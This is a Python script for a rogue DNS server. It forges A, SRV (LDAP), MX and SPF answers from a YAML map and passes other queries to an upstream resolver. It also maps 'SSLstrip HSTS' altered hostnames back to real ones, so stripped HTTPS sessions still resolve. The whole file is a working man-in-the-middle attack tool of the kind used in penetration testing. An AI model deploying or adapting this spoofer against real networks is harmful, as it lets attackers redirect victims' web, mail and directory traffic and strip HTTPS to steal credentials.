#!/usr/bin/python

from pprint import pprint
import getopt
import sys
import signal
import yaml
import socket
from dnslib import *

def usage (progName):
	""" Print the program's usage and then sys.exit() """
	print ("Usage: %s -c <configuration file> -l <listening address> -p <listening port> -r <remote resolver IP> " % progName)
	sys.stdout.flush ()
	sys.exit (0)

def handleArgs (argv):
	""" Handle arguments parsing """
	global confFile, lPort, lIp, rIp

	if (len (argv) < 2):
		usage (argv[0])

	try:
		opts, args = getopt.getopt (argv[1:], "c:p:r:l:") 

	except getopt.GetoptError:

		usage (argv[0])

	for opt, arg in opts:

		if (opt == "-c"):
			confFile = arg

		elif (opt == "-p"):
			lPort = arg
		
		elif (opt == "-r"):
			rIp = arg

		elif (opt == "-l"):
			lIp = arg

def sigintHandler (signal, frame):
	global run
	print ("\t[!]\tCaugth SIGINT, exiting...")
	sys.stdout.flush ()
	# Clean version: set the global event "run" to false to stop the main loop
	run = False
	# Not so clean version
	#~ sys.exit (0)



class dnsResolver ():
	""" DNS resolver definition """
	confMap = None
	#~ dnsReply = None
	forwarder = None
	socket = None

	def __init__ (self, ip, confMap):
		print ("[*]\tThe DNS resolver for this session is %s" % ip)
		sys.stdout.flush ()
		self.forwarder = ip
		self.confMap = confMap

		try:
			self.socket = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)

		except socket.error:
			print ("[!]\tFailed to create forwarding socket")
			sys.stdout.flush ()
			sys.exit (1)

	def run (self, rawRequest):
		dnsRequest = DNSRecord.parse (rawRequest)
		splitQname = dnsRequest.get_q ().qname.label
		match = 0
		qtype = None
		tmpList = None
		dnsReply = None

		# If the current query is a A
		if dnsRequest.get_q ().qtype == 1:

			# If its a SSLstrip HSTS modified hostname
			if splitQname[0] in self.confMap["SSLSTRIP"].keys ():
				print ("[*]\tHandling SSLstrip HSTS mutation for %s" % ".".join (splitQname))
				sys.stdout.flush ()

				# Craft the query for the legit DNS server with the correct hostname
				tmpList = list (dnsRequest.q.qname.label)
				tmpList[0] = self.confMap["SSLSTRIP"][splitQname[0]]
				dnsRequest.q.qname.label = tuple (tmpList)

				# Send the legitimate query to the DNS server
				dnsReply = self.forward (dnsRequest.pack ())

				# Craft the answer for the client
				tmpList[0] = splitQname[0]
				dnsReply.q.qname.label = tuple (tmpList)
				dnsReply.a.rname.label = dnsReply.q.qname.label

			# If it's not SSLstrip HSTS, simply handle the query
			else:
				match = self.findFQDN (splitQname, self.confMap["A"])
				qtype = "A"

		# If it's a SRV
		elif dnsRequest.get_q ().qtype == 33:
			match = self.findFQDN (splitQname, self.confMap["SRV"])
			qtype = "SRV"

		# If it's a MX
		elif dnsRequest.get_q ().qtype == 15:
			match = self.findFQDN (splitQname, self.confMap["MX"])
			qtype = "MX"

		# If it's a SPF
		elif dnsRequest.get_q ().qtype == 99:
			match = self.findFQDN (splitQname, self.confMap["SPF"])
			qtype = "SPF"

		if dnsReply is None:

			if match:
				print ("[*]\tResolving %s in %s" % (".".join (splitQname), qtype))
				sys.stdout.flush ()
				dnsReply = self.resolve ('.'.join (splitQname), self.confMap[qtype][match], dnsRequest, qtype)

			else:
				print ("[*]\tForwarding %s to external resolver" % '.'.join (splitQname))
				sys.stdout.flush ()
				dnsReply = self.forward (rawRequest)

		return dnsReply

	def resolve (self, question, answer, request, qtype):
		dnsReply = request.reply ()
		
		# If the current query is a A
		if qtype == "A":
			#~ self.dnsReply.add_answer (RR (question, rdata = A (answer)))
			dnsReply.add_answer (RR (question, rdata = A (answer)))

		# If it's a SRV
		elif qtype == "SRV":
			# Craft a SRV LDAP response (priority 0, weight 100, port 389)
			#~ self.dnsReply.add_answer (RR (question, QTYPE.SRV, rdata = SRV (0, 100, 389, answer)))
			dnsReply.add_answer (RR (question, QTYPE.SRV, rdata = SRV (0, 100, 389, answer)))

		# If it's a MX
		elif qtype == "MX":
			# Craft a MX response (priority 10)
			#~ self.dnsReply.add_answer (RR (question, QTYPE.MX, rdata = MX (answer, 10)))
			dnsReply.add_answer (RR (question, QTYPE.MX, rdata = MX (answer, 10)))

		# If it's a SPF
		elif qtype == "SPF":
			#~ self.dnsReply.add_answer (RR (question, QTYPE.SPF, rdata = TXT (answer)))
			dnsReply.add_answer (RR (question, QTYPE.SPF, rdata = TXT (answer)))

		return (dnsReply)

	def forward (self, request):
		dnsReply = None

		try:
			self.socket.sendto (request, (self.forwarder, 53))
			d = self.socket.recvfrom (1024)

			data = d[0]
			addr = d[1]
	
			#~ self.dnsReply = DNSRecord.parse (data)
			dnsReply = DNSRecord.parse (data)

		except socket.error:
			print ("[!]\tFailed to forward DNS request")

		return (dnsReply)

	def close (self):
		self.socket.close ()

	def findFQDN (self, fqdn, confHash):
		match = 0

		# For each Hash in the "A" part of the conf file
		for key in confHash:

			if key == "any":
				match = "any"
				break

			confFQDN = key.split ('.')

			# Continue to the next loop if query FQDN is less specific than the conf FQDN
			if len (fqdn) < len (confFQDN):
				continue

			# Compare each request FQDN element with current conf domain from end to beginning
			for i in range (-1, -(len (confFQDN)) - 1, -1):

				if fqdn[i] == confFQDN[i]:

					if -i == len (confFQDN):
						match = 1
						break
				else:
					break
					
			if match:
				match = key
				break

		return (match)



class dnsListener ():
	""" DNS server definition """
	ip = "127.0.0.1"
	port = "53"
	socket = None

	def __init__ (self, lIp, lPort):
		print ("[*]\tListening on %s:%s" % (lIp, lPort))
		sys.stdout.flush ()
		self.ip = lIp
		self.port = lPort

	def bind (self):
		# Try to create the UDP socket
		try :
			self.socket = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)

		except socket.error:
			print ("[!]\tFailed to create listening socket.")
			sys.stdout.flush ()
			sys.exit (1)

		# Try to bind to the socket
		try:
			self.socket.bind ((self.ip, int (self.port)))

		except socket.error:
			print ("[!]\tFailed to bind to the socket. Hint: you need r00t privileges")
			sys.stdout.flush ()
			sys.exit (1)
	
	def listen (self, resolver):

		while (run):
			# Try to receive data
			try:
				d = self.socket.recvfrom (1024)

			except socket.error:
				print ("[!]\tError while receiving data from client")
				sys.stdout.flush ()

			data = d[0]
			addr = d[1]

			# Continue if there's no data in the packet
			if (not data):
				continue

			# Forward the received data to the resolver
			reply = resolver.run (data)

			# Answer to the client
			try:
				self.socket.sendto (reply.pack (), addr)

			except:
				print ("[!]\tFailed to reply to DNS query")
				sys.stdout.flush ()

	def close (self):
		self.socket.close ()




# Default configuration
confFile = ""
lPort = "53"
lIp = "127.0.0.1"
rIp = "8.8.8.8"

# Create a True/False flag
run = True

# Initialize the SIGINT handler
signal.signal(signal.SIGINT, sigintHandler)

handleArgs (sys.argv)

# Try to open the YAML configuration file
try:
	f = open (confFile)

except:
	print ("[!]\tCan't open %s" % confFile)
	sys.stdout.flush ()
	sys.exit (1)

# Try to load the YAML configuration into an dictionnary
try:
	confMap = yaml.safe_load (f)

except:
	print ("[!]\tError while importing YAML configuration from %s" % confFile)
	sys.stdout.flush ()
	sys.exit (1)

# Try to close the YAML configuration file
try:
	f.close ()

except:
	print ("[!]\tError while closing %s" % confFile)
	sys.stdout.flush ()
	sys.exit (1)


resolver = dnsResolver (rIp, confMap)
listener = dnsListener (lIp, lPort)
listener.bind ()
listener.listen (resolver)
listener.close ()
resolver.close ()
